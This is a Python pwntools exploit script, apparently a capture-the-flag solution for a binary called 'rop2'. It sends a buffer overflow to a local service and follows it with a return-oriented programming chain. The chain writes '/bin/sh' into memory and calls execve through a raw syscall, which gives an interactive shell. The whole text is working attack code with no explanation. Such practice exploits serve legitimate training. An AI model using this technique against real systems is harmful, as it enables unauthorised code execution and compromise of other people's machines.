from pwn import *

context.arch = 'amd64'

io = remote('localhost', '8312')
# io = process('./rop2')

pop_rdi = 0x401c9d
pop_rsi = 0x40481c
pop_rax_rdx_rbx = 0x45fc06
mov_qword_rdx_rax = 0x406f80
syscall = 0x40128b
ret = 0x401016

rop_chain = flat([pop_rax_rdx_rbx, b'/bin/sh\0', 0x49e000, 0, mov_qword_rdx_rax])
rop_chain += flat([pop_rax_rdx_rbx, 0x3b, 0, 0, pop_rdi, 0x49e000, pop_rsi, 0, syscall])
io.recvline()
io.sendline(b'a'*0x18 + rop_chain)

io.interactive()
